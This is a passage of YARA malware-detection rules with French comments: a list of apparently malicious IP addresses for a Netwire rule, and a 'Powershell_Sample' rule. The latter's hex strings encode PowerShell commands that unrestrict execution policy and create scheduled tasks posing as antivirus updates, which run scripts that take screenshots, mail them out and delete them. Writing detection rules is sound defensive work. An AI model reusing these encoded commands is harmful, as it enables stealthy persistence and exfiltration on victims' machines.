		$IP11 = "213.152.162.94"
		$IP12 = "213.152.162.109"
		$IP13 = "37.233.101.73"
		$IP14 = "213.152.161.35"
		$IP15 = "109.232.227.133"
		$IP16 = "213.152.161.211"
		$IP17 = "213.152.180.5"
		$IP18 = "213.152.162.89"
		$IP19 = "109.232.227.138"
		$IP20 = "213.152.162.104"
	condition:
	 any of them and Netwirehash
}

rule Powershell_Sample
{
	meta:
		description = "Envoi de l'invite de commande d'une machine cible sur une machine attaquante"
	strings:
		$Check1 = {70 72 6F 63 65 73 73 3D 73 75 62 70 72 6F 63 65 73 73 2E 50 6F 70 65 6E 28 5B 22 70 6F 77 65 72 73 68 65 6C 6C 22 2C 22 53 65 74 2D 45 78 65 63 75 74 69 6F 6E 50 6F 6C 69 63 79 20 55 6E 72 65 73 74 72 69 63 74 65 64 22 5D 2C 20 73 68 65 6C 6C 3D 46 61 6C 73 65 29 3B}
		// Vérifie la politique d'exécution sur non-restreint
		$Task1 = {70 72 6F 63 65 73 73 3D 73 75 62 70 72 6F 63 65 73 73 2E 50 6F 70 65 6E 28 5B 22 70 6F 77 65 72 73 68 65 6C 6C 22 2C 22 73 63 68 74 61 73 6B 73 20 2F 63 72 65 61 74 65 20 2F 73 63 20 6D 69 6E 75 74 65 20 2F 6D 6F 20 31 20 2F 74 6E 20 4D 69 63 72 6F 73 6F 66 74 41 6E 74 69 56 69 72 75 73 43 72 69 74 69 63 61 6C 55 70 64 61 74 65 73 43 6F 72 65 20 2F 74 72 20 43 3A 5C 50 79 74 68 6F 6E 33 36 5C 53 68 6F 6F 74 2E 76 62 73 22 5D 2C 20 73 68 65 6C 6C 3D 46 61 6C 73 65 29 3B}
		// Création d'une tâche programmer 
		$Task2 = {70 72 6F 63 65 73 73 3D 73 75 62 70 72 6F 63 65 73 73 2E 50 6F 70 65 6E 28 5B 22 70 6F 77 65 72 73 68 65 6C 6C 22 2C 22 73 63 68 74 61 73 6B 73 20 2F 63 72 65 61 74 65 20 2F 73 63 20 6D 69 6E 75 74 65 20 2F 6D 6F 20 35 20 2F 74 6E 20 4D 69 63 72 6F 73 6F 66 74 41 6E 74 69 56 69 72 75 73 43 72 69 74 69 63 61 6C 55 70 64 61 74 65 73 55 41 20 2F 74 72 20 43 3A 5C 50 79 74 68 6F 6E 33 36 5C 4D 61 69 6C 2E 76 62 73 22 5D 2C 20 73 68 65 6C 6C 3D 46 61 6C 73 65 29 3B}
		// Envoie d'un mail via un programme Python
		$DelTask1 = {70 72 6F 63 65 73 73 3D 73 75 62 70 72 6F 63 65 73 73 2E 50 6F 70 65 6E 28 5B 22 70 6F 77 65 72 73 68 65 6C 6C 22 2C 22 73 63 68 74 61 73 6B 73 20 2F 63 72 65 61 74 65 20 2F 73 63 20 6D 69 6E 75 74 65 20 2F 6D 6F 20 31 32 20 2F 74 6E 20 4D 69 63 72 6F 73 6F 66 74 41 6E 74 69 56 69 72 75 73 43 72 69 74 69 63 61 6C 55 70 64 61 74 65 73 44 46 20 2F 74 72 20 43 3A 5C 50 79 74 68 6F 6E 33 36 5C 64 65 6C 53 63 72 65 65 6E 53 68 6F 74 2E 76 62 73 22 5D 2C 20 73 68 65 6C 6C 3D 46 61 6C 73 65 29 3B}
		// Suprmme la tâche programmée 
	condition:
		all of them 
}












